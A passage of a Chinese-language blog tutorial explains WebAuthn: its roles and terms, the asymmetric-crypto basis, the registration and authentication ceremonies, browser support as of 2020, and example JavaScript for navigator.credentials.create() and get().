中一些常用的术语和概念。</p>\n<blockquote><p>WebAuthn 只能在安全上下文中使用，也就是说，页面需要使用 HTTPS 协议或是处于 <code>localhost</code> 中。</p></blockquote>\n<h2>常用术语和概念</h2>\n<p>WebAuthn 中有许多不常碰到的术语，不过我只会在这里介绍一些常用的术语和概念——如果你只是希望做出一个简单的实现，那么了解这一段中的一些概念就足够了。同时，由于我实在没能找到一部分术语的通用翻译，有一些术语我按着自己的理解尽可能地翻译了，有任何问题请告诉我。</p>\n<p>在一个完整的 WebAuthn 认证流程中，通常有这么几个角色：</p>\n<ul>\n<li>Relying Party 依赖方 (RP) ：指服务提供方，即网站</li>\n<li>User 用户：正准备登录的你</li>\n<li>Authenticator 认证器：通常指 USB Key 或是设备内置的指纹扫描器、虹膜扫描器、面部识别装置等，正是它们在使用流程中代替了密码甚至是用户名</li>\n<li>User Agent 用户代理：通常指浏览器或系统，负责与认证器交互</li>\n</ul>\n<p>认证过程通常分为两种：</p>\n<ul>\n<li>Registration Ceremony 注册仪式：用户向账户上添加认证器</li>\n<li>Authentication Ceremony 验证仪式：用户通过已注册的认证器验证身份</li>\n</ul>\n<p>同时，认证过程中还会产生这些内容：</p>\n<ul>\n<li>Challenge 挑战：通常是一串随机字符串</li>\n<li>Public Key Credential 公钥凭证：由认证器产生的凭证，在技术上代替了密码</li>\n<li>Attestation 证明：注册时认证器产生的验证数据</li>\n<li>Assertion 断言：验证时认证器产生的验证数据</li>\n</ul>\n<blockquote><p><strong>请注意区分证明 (Attestation) 和断言 (Assertion)</strong>，特别是在这两个单词有些相似的情况下。在 WebAuthn 中，它们是不同过程中的类似概念，但并不相同。</p></blockquote>\n<p>如果你对于这些内容不是很理解，没有关系，我们会在“<a href=\"https://flyhigher.top/#how-to-webauthn\">使用流程</a>”一节中将这些概念放到实际情况中解释，你只要先区分这些概念即可。</p>\n<h2>安全性的基础</h2>\n<p>WebAuthn 为什么安全？和 HTTPS 一样，WebAuthn 使用非对称加密的思路来保证安全性，但侧重点又有所不同。要理解 WebAuthn 的认证流程，我们必须对非对称加密有所了解。如果你对非对称加密比较熟悉了，就直接跳到下一段吧。</p>\n<p>WebAuthn 的核心在于“认证”，即保证产生了凭证的认证器是用户的认证器，而不是第三方在伪造凭证。但为什么要使用非对称加密呢？我们可以先来看看对称加密。</p>\n<p>让我们假设小明和小红相互写信，见不到对方。这天小红突然想，给自己写信的人是不是真的小明呢？于是小红要求对方向小红证明自己是小明。怎么证明呢？他们商量出来这么一套方案：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明和小红商量一个统一的密码和密钥</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明用提前和小红商量好的密码和密钥加密文本后发回给小红</li>\n<li>小红使用相同的密码和密钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和密钥</li>\n</ol>\n<blockquote><p>在密码学中，我们通常把“加密算法”称为密码 (code)，和通常登录时用的密码 (password) 并非同一个概念。</p></blockquote>\n<p>在这种情况下，<strong>只要密钥不泄露</strong>，即拥有正确密钥的只有小明和小红，那么小红就能确定对方一定是小明。但这样的问题也很明显，如果小明和小红不能见面，那么他们就必须先以明文交换密码——<strong>在这个过程中一旦有人窃取到了密码，这个认证就无效了。</strong></p>\n<p>这时我们就需要使用<strong>非对称加密</strong>来拯救破碎的信任了。非对称加密的基础是一对密钥，也就是公钥和私钥，它们是互相关联但（几乎）无法互相推导的。在非对称加密的过程中，选择相同的密码后，使用私钥加密明文得到的密文只能由对应的公钥解密，无法使用私钥解密，同时这个过程反过来也是成立的。</p>\n<blockquote><p>本文的核心并不是非对称加密算法，因此不会详述非对称加密在数学上的证明，若有兴趣可以自行了解。</p></blockquote>\n<p>这就完美解决密钥泄露的问题了。让我们回过头来看之前的例子。现在小明和小红决定使用非对称加密来证明身份，过程如下：</p>\n<ol>\n<li>在小明的身份已经验证的情况下，小明提前生成一对公私钥，将公钥发送给小红，私钥自己保管，同时商量好统一的密码</li>\n<li>一段时间后，在小红要求小明验证身份时，小红发送一段文本给小明</li>\n<li>小明使用商量好的密码和自己的私钥加密文本，发送给小红</li>\n<li>小红使用相同的密码和小明的公钥解密文本，如果得到文本和之前发送的一致，就表明对方拥有正确的密码和私钥</li>\n</ol>\n<p>在这种情况下，<strong>只要私钥不泄露</strong>，那么小红解密得到的文本和之前发送的一致，那么就可以证明收到的密文一定是由小明加密后发送过来的。而在整个过程中，私钥都没有离开过小明，更没有经过传输，也就几乎没有泄露的可能了。这时，小红终于可以确定对面和她通信的人的确是小明了。</p>\n<p>题外话：HTTPS 虽然也应用了非对称加密，但 HTTPS 更侧重于“加密”而非“认证”，因此思路上会有些许差异。要了解关于 HTTPS 和非对称加密的更多信息，你可以阅读我之前写的这篇文章：</p>\n<p></p>\n<div class=\"mdx-post-cot\" data-mdxposturl=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdx-post-wait-out-c2\"><div class=\"mdx-post-wait-out-c mdui-valign\"><div class=\"mdx-github-wait-out\"><div class=\"mdx-github-wait\"><a href=\"https://flyhigher.top/develop/1093.html\"><div class=\"mdui-spinner\"></div></a></div></div></div></div></div>\n<span></span>\n<h2>使用流程</h2>\n<p>了解了非对称加密，我们就可以来看看 WebAuthn 的认证流程了。</p>\n<p>和普通的密码一样，<strong>使用 WebAuthn 分为两个部分，注册和验证。</strong>注册仪式会在依赖方中将认证器的一些信息和用户建立关联；而验证仪式则是验证这些信息以登确保是用户本人在登录。根据上一节的思路，我们可以知道，注册仪式就是认证器生成一对公私钥，然后将公钥交给依赖方；而验证仪式是依赖方发送给认证器一段文本，要求认证器用自己的私钥加密后发回以验证。</p>\n<p>在实际情况中，WebAuthn 是基于<strong>挑战-应答模型</strong>工作的。要更好地理解，我们直接来看具体流程。先来看看注册的流程。</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc1.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 注册流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2224\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的注册请求</li>\n<li>依赖方向浏览器发送挑战、依赖方信息和用户信息</li>\n<li>浏览器向认证器发送挑战、依赖方信息、用户信息和客户端信息以请求创建公钥凭证</li>\n<li>认证器请求用户动作，随后创建一对公私钥，并使用私钥签名挑战（即证明），和公钥一起交给浏览器</li>\n<li>浏览器将签名后的挑战和公钥发送给依赖方</li>\n<li>依赖方用公钥验证挑战是否与发送的一致，如果成功则将公钥与用户绑定，注册完成</li>\n</ol>\n<p>我也做了一个交互式的 Demo，你可以对照流程来更好地理解。</p>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\">开始注册</button> <span></span></p>\n<div></div>\n<blockquote><p>注意，这个 Demo 和下方的 Demo 都只是一个本地模拟的简单示例，没有任何数据会被上传，当然也不会对数据进行验证。</p></blockquote>\n<p>而之后的验证流程如下：</p>\n<a href=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png\"><img loading=\"lazy\" src=\"https://acdn.flyhigher.top/wp-content/uploads/2020/03/lc2.png?x-oss-process=image/interlace,1/quality,Q_90#\" alt=\"WebAuthn 验证流程\" width=\"1100\" height=\"604\" class=\"aligncenter size-full wp-image-2226\"></a>\n<ol>\n<li>浏览器向依赖方发送某个用户的验证请求</li>\n<li>依赖方向浏览器发送挑战</li>\n<li>浏览器向认证器发送挑战、依赖方信息和客户端信息以请求获取公钥凭证</li>\n<li>认证器请求用户动作，随后通过依赖方信息找到对应私钥，并使用私钥签名挑战（即断言），交给浏览器</li>\n<li>浏览器将签名后的挑战发送给依赖方</li>\n<li>依赖方用之前存储的公钥验证挑战是否与发送的一致，一致则验证成功</li>\n</ol>\n<p><button class=\"mdui-btn mdui-btn-raised mdui-ripple mdui-color-theme-accent\" disabled>开始验证</button> <span>在上方注册后才能验证</span></p>\n<div></div>\n<p>可以看到，WebAuthn 不仅在理论上是安全的，同时<strong>在整个过程中并没有隐私数据被传输</strong>——用户信息实际上只包含用户名和用户 ID。因此我们完全可以说 WebAuthn 是安全且私密的。</p>\n<blockquote><p>为了避免用户在不同依赖方之间被追踪，认证器通常会为每个依赖方和用户的组合都创建一对公私钥。不过，由于认证器的存储空间有限，认证器通常不会存储每一个私钥，而是会通过各类信息和烧录在认证器内的主密钥“算”出对应的私钥以实现无限对公私钥。具体算法根据不同厂商会有所不同。对于 Yubikey，你可以在<a href=\"https://developers.yubico.com/U2F/Protocol_details/Key_generation.html\">这里</a>了解更多。</p></blockquote>\n<blockquote><p>如果依赖方需要，用户同意后，发送给依赖方的公钥凭证中可以包含用于辨认认证器型号的信息，不过这对隐私的影响微乎其微。</p></blockquote>\n<h2>浏览器接口</h2>\n<p>要使用 WebAuthn，我们必须要依靠浏览器作为媒介和验证器进行交互，而这就需要浏览器对于 WebAuthn 的支持了。绝大多数新版本的现代浏览器都为 WebAuthn 提供了统一的接口，而在这一段中我们会了解如何使用相关的接口。但是在开始之前，我们可以先来看看浏览器的支持程度（2020.9）。</p>\n<div class=\"mdui-table-fluid\"><table class=\"mdui-table\">\n<thead><tr>\n<th>浏览器</th>\n<th>支持情况</th>\n</tr></thead>\n<tbody>\n<tr>\n<td>桌面端 Chrome</td>\n<td>67+</td>\n</tr>\n<tr>\n<td>移动端 Chrome</td>\n<td>67+<sup>[1]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Firefox</td>\n<td>60+</td>\n</tr>\n<tr>\n<td>移动端 Firefox</td>\n<td>不支持<sup>[2]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Edge</td>\n<td>18+</td>\n</tr>\n<tr>\n<td>移动端 Edge</td>\n<td>不支持<sup>[3]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Safari</td>\n<td>13+</td>\n</tr>\n<tr>\n<td>移动端 Safari</td>\n<td>13.3+<sup>[4]</sup>\n</td>\n</tr>\n<tr>\n<td>桌面端 Opera</td>\n<td>54+</td>\n</tr>\n<tr>\n<td>移动端 Opera</td>\n<td>不支持</td>\n</tr>\n</tbody>\n</table></div>\n<p><sup>[1]</sup> 受平台限制，Chrome 在 iOS 平台上不支持 WebAuthn，在 Android 平台上支持大部分 WebAuthn 功能，但仍不支持部分特性（如 <code>userVerification</code>）。<br><sup>[2]</sup> 移动端 Firefox 80 以下的版本支持 WebAuthn 但似乎会忽略 <code>authenticatorAttachment</code> 等一部分参数，同时移动端 Firefox Beta 80 以下的版本支持 WebAuthn 但无法成功调用。自 80 版本起移动端 Firefox 暂时取消了对 WebAuthn 的支持（可能是 Bug）。<br><sup>[3]</sup> 移动端 Edge 似乎支持 WebAuthn 但无法成功调用。<br><sup>[4]</sup> Safari iOS/iPad OS 13 仅支持外部认证器，无法调用 Touch ID 或 Face ID；自 iOS/iPad OS 14 起 Safari 已支持全功能 WebAuthn，可以调用 Touch ID/Face ID</p>\n<p>当然，一众国产浏览器，包括 Samsung Browser 和 Yandex Browser，目前都不支持 WebAuthn。此外，由于 WebAuthn 涉及外部验证器和 TPM 可信平台模块等，用户的操作系统也会对 WebAuthn 的可用性造成影响。以下是一些需要注意的信息：</p>\n<ul>\n<li>Windows 10 1903 以下版本仅 Edge 能提供完整支持，其他浏览器只能使用 USB Key 等外部认证器；1903+ 中所有浏览器都可以通过 Windows Hello 带来完整的 WebAuthn 支持</li>\n<li>Android 需要安装并开启 Google 服务</li>\n<li>iOS/iPad OS 13.3 以下的版本不支持 WebAuthn，iOS/iPad OS 14 以下的版本支持有限（参考上文），iOS/iPad OS 14 开始 Safari 已支持全功能 WebAuthn（功能完整度甚至超过了 Android）</li>\n</ul>\n<p>可以看出，WebAuthn 的发展之路仍然很漫长，但好在桌面端对它的支持已经比较完善了，在一些情况下我们完全有理由使用它。</p>\n<hr>\n<p>来看看浏览器提供了怎么样的接口吧。要使用 WebAuthn，我们可以使用 <code>navigator.credentials.create()</code> 请求认证器生成公钥凭证和 <code>navigator.credentials.get()</code> 请求获取公钥凭证。</p>\n<blockquote><p>你或许已经对 Credential Management API 有所了解了。通过这些 API，我们还可以实现一些有趣的特性，不过这值得另开一篇文章来讲了。</p></blockquote>\n<p>对于一个基础的实现，<code>navigator.credentials.create()</code> 需要传入的参数如下：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({\r\n    publicKey: {\r\n        challenge,\r\n        rp: {\r\n            id,\r\n            name\r\n        },\r\n        user: {\r\n            id,\r\n            name,\r\n            displayName\r\n        },\r\n        pubKeyCredParams: [\r\n            {\r\n                type: \"public-key\",\r\n                alg\r\n            }\r\n        ],\r\n        authenticatorSelection: {\r\n            authenticatorAttachment,\r\n            userVerification\r\n        },\r\n        excludeCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>在 <code>navigator.credentials.create()</code> 方法中，我们必须传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值。这指明了我们需要创建公钥凭证，而非普通的密码凭证。然后，在 <code>publicKey</code> 对象中设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rp: Object</code>：依赖方信息，其中有一项为必须：\n<ul>\n<li>\n<code>rp.id: String</code>：（可选）依赖方 ID，必须为当前域名或为当前域名的子集的域名（不是子域名）。如域名为 <code>test.123.example.com</code>，则依赖方 ID 可以是 <code>test.123.example.com</code>, <code>123.example.com</code> 或 <code>example.com</code>。不指定则默认使用当前域名</li>\n<li>\n<code>rp.name: String</code>：依赖方名称，用于方便用户辨认</li>\n</ul>\n</li>\n<li>\n<code>user: Object</code>：用户信息，其中有三项为必须：\n<ul>\n<li>\n<code>user.id: Uint8Array</code>：转换为 <code>Uint8Array</code> 的字符串。<strong>出于安全考量，这应尽可能不与任何用户信息相关联，如不要包含用户名、用户邮箱等</strong>\n</li>\n<li>\n<code>user.name: String</code>：登录用户名</li>\n<li>\n<code>user.dispalyName: String</code>：用于显示的用户名称，显示与否的具体行为取决于浏览器</li>\n</ul>\n</li>\n<li>\n<code>pubKeyCredParams: Array</code>：一个算法列表，指明依赖方接受哪些签名算法。列表的每一项都是一个对象，拥有两个属性：\n<ul>\n<li>\n<code>pubKeyCredParams[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>pubKeyCredParams[].alg: Number</code>：一个负整数，用于标明算法。具体算法对应的数字可以在 <a href=\"https://www.iana.org/assignments/cose/cose.xhtml#algorithms\">COSE</a> 找到</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection: Object</code>：（可选）用于过滤正确的认证器，这里介绍常用的一个参数：\n<ul>\n<li>\n<code>authenticatorSelection.authenticatorAttachment: String</code>：（可选）指定要求的认证器类型。如果没有满足要求的认证器，认证可能会失败。该参数可以为 <code>null</code>（表示接受所有类型的认证器）或是以下两个值之一：\n<ul>\n<li>\n<code>platform</code>：表示仅接受平台内置的、无法移除的认证器，如手机的指纹识别设备</li>\n<li>\n<code>cross-platform</code>：表示仅接受外部认证器，如 USB Key</li>\n</ul>\n</li>\n<li>\n<code>authenticatorSelection.userVerification: String</code>：（可选）指定认证器是否需要验证“用户为本人 (User Verified, UV)”，否则只须“用户在场 (User Present, UP)”。具体验证过程取决于认证器（不同认证器的认证方法不同，也有认证器不支持用户验证），而对验证结果的处理情况则取决于依赖方。该参数可以为以下三个值之一：\n<ul>\n<li>\n<code>required</code>：依赖方要求用户验证</li>\n<li>\n<code>preferred</code>：（默认）依赖方希望有用户验证，但也接受用户在场的结果</li>\n<li>\n<code>discouraged</code>：依赖方不关心用户验证。对于 iOS/iPad OS 13，必须设置为此值，否则验证将失败</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>excludeCredentials: Array</code>：（可选）用于标识要排除的凭证，可以避免同一个用户多次注册同一个认证器。如果用户试图注册相同的认证器，用户代理会抛出 <code>InvalidStateError</code> 错误。数组中的每一项都是一个公钥凭证对象，包含以下属性：\n<ul>\n<li>\n<code>excludeCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>excludeCredentials[].id: Uint8Array</code>：要排除的凭证 ID</li>\n<li>\n<code>excludeCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，超时后将强制终止 <code>create()</code> 并抛出错误。若不设置，将使用用户代理的默认值；若太大或太小，则使用最接近的用户代理默认值范围中的值。推荐值为 5000-120000</li>\n</ul>\n<blockquote><p>对于 <code>pubKeyCredParams</code>，通常我们只需添加 ES256 (alg: -7) 算法即可兼容大部分外部认证器，此外，再添加 RS256 (alg: -257) 算法即可兼容大部分平台内置认证器（如 Windows Hello）。当然，前端添加算法之后，后端也需要相应的算法支持。</p></blockquote>\n<blockquote><p>对于 <code>userVerification</code>，由于默认值 “preferred” 并不能很好地被所有设备支持，因此无论在 <code>create()</code> 中还是 <code>get()</code> 中不指定该参数都会在 Chrome 中触发一条警告。具体请参阅<a href=\"https://chromium.googlesource.com/chromium/src/+/master/content/browser/webauth/uv_preferred.md\">这个页面</a>。</p></blockquote>\n<p>调用 <code>create()</code> 之后，我们就可以拿到一个 <code>Promise</code>，并可以在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>create()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAttestationResponse {\r\n        attestationObject: ArrayBuffer(390) {},\r\n        clientDataJSON: ArrayBuffer(121) {}\r\n    },\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\",\r\n    type: \"public-key\"\r\n}</pre>\n<p>其中有：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：<code>AuthenticatorAttestationResponse</code> 对象，是 <code>PublicKeyCredential</code> 的主要部分，包含以下两个内容：\n<ul>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n<li>\n<code>response.attestationObject: ArrayBuffer</code>：CBOR 编码的认证器数据，包含凭证公钥、凭证 ID、签名（如果有）、签名计数等信息</li>\n</ul>\n</li>\n</ul>\n<p>然后将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串，我们就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证与注册了。具体怎么操作，我们会在下文详细讨论。当然，别忘了 <code>catch()</code> 注册过程中抛出的任何错误。</p>\n<blockquote><p>你可能会认为在所有情况下，注册时认证器都会对挑战进行签名。实际上在大部分情况下（同时也是默认情况），<strong>注册时认证器并不会对挑战进行签名</strong>，<code>attestationObject</code> 并不会包含签名后的挑战。只有依赖方明确要求证明且用户同意（部分浏览器要求）后认证器才会对挑战进行签名（具体实现据情况会有所不同）。对此，<a href=\"https://developer.mozilla.org/en-US/docs/Web/API/Web_Authentication_API/Attestation_and_Assertion#Attestation\">MDN 解释道</a>“大部分情况下，用户注册公钥时我们会使用「初次使用时信任模型」(TOFU) ，此时验证公钥是没有必要的。”要了解更多关于证明的内容，请参阅“<a href=\"https://flyhigher.top/#verify-authenticator\">验证认证器</a>”一节。</p></blockquote>\n<p>而对于 <code>navigator.credentials.get()</code>，我们可以传入如下的参数：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.get({\r\n    publicKey: {\r\n        challenge,\r\n        rpId,\r\n        userVerification,\r\n        allowCredentials: [\r\n            {\r\n                id,\r\n                transports: [],\r\n                type: \"public-key\"\r\n            }\r\n        ],\r\n        timeout\r\n    }\r\n})</pre>\n<p>和 <code>create()</code> 一样，对于 <code>get()</code> 我们需要传入一个对象，其中只有一对名为 <code>publicKey</code> 的键值，指明我们需要获取的是公钥凭证而非普通的密码凭证。在 <code>publicKey</code> 对象中我们可以设置这些常用参数：</p>\n<ul>\n<li>\n<code>challenge: Uint8Array</code>：转换为 <code>Uint8Array</code> 的挑战，长度至少为 16，建议为 32</li>\n<li>\n<code>rpID: String</code>：（可选）依赖方 ID，需要和注册认证器时的一致。规则和上述的 <code>rp.id</code> 一致，不指定默认使用当前域名</li>\n<li>\n<code>userVerification: String</code>：和上文一样，只是需要注意它这次不在 <code>authenticatorSelection</code> 中了</li>\n<li>\n<code>allowCredentials: Array</code>：（可选）用于标识允许的凭证 ID，使用户代理找到正确的认证器。只有符合这个列表中凭证 ID 的凭证才能被成功返回。数组中的每一项都是对象，包含以下属性：\n<ul>\n<li>\n<code>allowCredentials[].type: String</code>：值只能为 “public-key”</li>\n<li>\n<code>allowCredentials[].id: Uint8Array</code>：允许的凭证 ID</li>\n<li>\n<code>allowCredentials[].transports: Array</code>：（可选）用于指定该凭证所需的认证器与用户代理的通信方式，可以包含以下的一或多个字符串：\n<ul>\n<li>\n<code>usb</code>：可以通过 USB 连接的认证器</li>\n<li>\n<code>nfc</code>：可以通过 NFC 连接的认证器</li>\n<li>\n<code>ble</code>：可以通过蓝牙连接的认证器</li>\n<li>\n<code>internal</code>：平台内置的、无法移除的认证器</li>\n</ul>\n</li>\n</ul>\n</li>\n<li>\n<code>timeout: Number</code>：（可选）方法超时时间的毫秒数，和上面的一样，推荐值为 5000-120000</li>\n</ul>\n<p>嗯，要传入的参数少多了。之后，和 <code>create()</code> 一样，调用 <code>get()</code> 之后，我们就可以拿到一个 <code>Promise</code> 并在 <code>then</code> 中获得认证器返回的 <code>PublicKeyCredential</code> 对象。以下是一个 <code>get()</code> 返回的 <code>PublicKeyCredential</code> 对象的例子：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">PublicKeyCredential {\r\n    rawId: ArrayBuffer(32) {},\r\n    response: AuthenticatorAssertionResponse {\r\n        authenticatorData: ArrayBuffer(37) {},\r\n        signature: ArrayBuffer(256) {},\r\n        userHandle: ArrayBuffer(64) {},\r\n        clientDataJSON: ArrayBuffer(118) {}\r\n    }\r\n    id: \"VByF2w2hDXkVsevQFZdbOJdyCTGOrI1-sVEzOzsNnY0\"\r\n    type: \"public-key\"\r\n}</pre>\n<p>这里的东西就比 <code>create()</code> 时拿到的要多了。看看我们拿到了什么吧：</p>\n<ul>\n<li>\n<code>id: String</code>：Base64URL 编码的凭证 ID</li>\n<li>\n<code>rawId: ArrayBuffer</code>：<code>ArrayBuffer</code> 的原始凭证 ID</li>\n<li>\n<code>type: String</code>：一定是 “public-key”</li>\n<li>\n<code>response: Object</code>：对于验证流程，认证会返回 <code>AuthenticatorAssertionResponse</code> 而不是 <code>AuthenticatorAttestationResponse</code> 对象，这个对象包含以下 4 个属性：\n<ul>\n<li>\n<code>response.authenticatorData: ArrayBuffer</code>：认证器信息，包含认证状态、签名计数等</li>\n<li>\n<code>response.signature: ArrayBuffer</code>：被认证器签名的 <code>authenticatorData</code> + <code>clientDataHash</code>（<code>clientDataJSON</code> 的 SHA-256 hash）</li>\n<li>\n<code>response.userHandle: ArrayBuffer</code>：<code>create()</code> 创建凭证时的用户 ID <code>user.id</code>。许多 U2F 设备不支持这一特性，这一项将会是 <code>null</code>\n</li>\n<li>\n<code>response.clientDataJSON: ArrayBuffer</code>：客户端数据，包含 origin（即凭证请求来源）、挑战等信息</li>\n</ul>\n</li>\n</ul>\n<p>同样地，我们将 <code>ArrayBuffer</code> 们以合适的方式编码成字符串后就可以把 <code>PublicKeyCredential</code> 发送给依赖方以供验证了。至于具体怎么做，别急，马上就来讲一讲。</p>\n<h2>简单实现</h2>\n<p>了这么多，我们终于可以实现一个简单的 WebAuthn 认证页面了。由于在实际操作中 WebAuthn 相关的数据解码和密码计算比较复杂，在服务器端我们可以使用第三方库来帮我们做这些脏活累活，我们只需专注于具体流程就可以了。</p>\n<p>要寻找可用的第三方库，你可以在 <a href=\"https://webauthn.io/\">webauthn.io</a> 上找到适用于各种语言的第三方库——除了 PHP（笑）。不过好在你可以在 GitHub 上找到几个不错的 PHP WebAuthn 库，比如 <a href=\"https://github.com/web-auth/webauthn-framework\">web-auth/webauthn-framework</a>。</p>\n<p>在我们的这个例子中，我们关心的主要是前端逻辑；而后端我们可以使用各类几乎已经做到开箱即用的第三方库，这样我们可以专注于流程而不必关心细节。当然如果你想了解后端的解码细节，可以阅读“<a href=\"https://flyhigher.top/#webauthn-decode\">手动解个码</a>”一节。</p>\n<hr>\n<p>让我们先从注册开始吧。现在，用户点击了注册认证器的按钮，一个请求被发送给服务器（也就是依赖方）。在最简单的情况中，依赖方需要将三个内容发送给浏览器：<strong>挑战、用户信息和用户已注册的凭证 ID 列表（即 <code>excludeCredentials</code>）</strong>。当然依赖方也可以自由选择发送更多信息，只要最终前端能构建合法的参数即可。</p>\n<p>挑战最终会被转换为 <code>Uint8Array</code>，即一组 0-255 的整数。如果使用 PHP，在后端我们可以这样生成 Base64 编码的挑战：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"php\">$challenge = \"\";\r\nfor($i = 0; $i \n<p>对于用户信息，我们需要登录名、显示名称和 ID 三项内容。我们可以从数据库中取出用户信息，也可以新建一份。需要注意的是，<strong>出于安全和隐私的考量，ID 不应该包含用户的任何信息，比如用户邮箱等。</strong>推荐的做法是和挑战一样，生成一个随机字符串/一组随机数，并将其于用户关联起来以供之后使用。</p>\n<p>发送已注册的凭证 ID 列表是为了防止用户重复注册同一个认证器。正确设置该列表后，如果用户试图注册同一个认证器，浏览器会中止流程并抛出 <code>InvalidStateError</code>。</p>\n<p>最后，别忘了将挑战等一些后续可能会用到的信息临时存储起来。Session 就是一个很好的选择。</p>\n<p>将所有信息发送到浏览器之后，我们应该可以构建出新建凭证所需的参数了。由于有多个参数需要以 <code>Uint8Array</code> 的形式传入，我们可以准备一个简单的工具函数帮我们将 Base64 的字符串转为 <code>Uint8Array</code>。</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function str2ab(str){\r\n    return Uint8Array.from(window.atob(str), c=&gt;c.charCodeAt(0));\r\n}</pre>\n<p>除了 <code>challenge</code>, <code>rp</code>, <code>user</code> 和 <code>excludeCredentials</code> 几部分需要你根据具体情况设置外，上文提到的其他参数一般可以这么设置：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">publicKey: {\r\n    challenge, // 自行设置\r\n    rp, // 自行设置\r\n    user, // 自行设置\r\n    pubKeyCredParams: [\r\n        {\r\n            type: \"public-key\",\r\n            alg: -7 // ES256\r\n        },\r\n        {\r\n            type: \"public-key\",\r\n            alg: -257 // RS256\r\n        }\r\n    ],\r\n    authenticatorSelection: {\r\n        userVerification: \"discouraged\",\r\n        authenticatorAttachment: null // 除非用户指定，大部分情况下无需指定\r\n    },\r\n    excludeCredentials, // 自行设置\r\n    timeout: 60000\r\n}</pre>\n<p>然后就是传入 <code>navigator.credentials.create()</code>，拿到 <code>PublicKeyCredential</code>。如果一切顺利，接下来我们就需要考虑如何将返回的内容传回依赖方了。由于我们拿到的很多都是 <code>ArrayBuffer</code>，我们需要将其进行编码。再准备一个工具函数吧：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">function array2b64String(a) {\r\n    return window.btoa(String.fromCharCode(...a));\r\n}</pre>\n<p>然后适当处理，我们就可以得到一个方便传输的 JSON 字符串了：</p>\n<pre class=\"EnlighterJSRAW\" data-enlighter-language=\"js\">navigator.credentials.create({publicKey}).then((credentialInfo) =&gt; {\r\n    const publicKeyCredential = {\r\n        id: credentialInfo.id,\r\n        type: credentialInfo.type,\r\n        rawId: array2b64String(new Uint8Array(credentialInfo.rawId)),\r\n        response: {\r\n            clientDataJSON: array2b64String(new Uint8Array(credentialInfo.response.clientDataJSON)),\r\n            attestationObject: array2b64String(new Uint8Array(credentialInfo.response.attestationObject))\r\n        }\r\n    };\r\n    return publicKeyCredential;\r\n}).then(JSON.stringify).then((authenticatorResponseJSON) =&gt; {\r\n    // 可以发送了\r\n}).catch((error) =&gt; {\r\n    console.warn(error); // 捕获错误\r\n})</pre>\n<p>依赖方收到数据以后，还需要做三件事：验证挑战、存储凭证 ID 和存储公钥。如果数据解码顺利，且收到的挑战和之前发送的一致，就可以认为注册成功，将凭证 ID 及公钥与用户关联起来。这一步有很多第三方库可以帮我们做，对于基础实现我们就不深入探究了。</p>\n<blockquote><p>由于不同厂商的认证器的实现方式不同，<strong>我们并不能保证凭证 ID 一定是全局唯一的</strong>，也就是说，凭证 ID 有可能碰撞——即使这些凭证实际上是不同的。依赖方在实现凭证 ID 的存储及查找时，需要注意和用户 ID 结合进行存储或查找，或是直接在注册认证器时在服务器端对比阻止相同的凭证 ID。</p></blockquote>\n<hr><p>接下来就可以进行验证了。某天，用户点击了验证按钮准备登录，于是浏览器发送了验证请求到依赖方，同时附上要登录的用户名。接下来依赖方至少需要发送两项内容给浏览器：<strong>挑战和用户已绑定的凭证 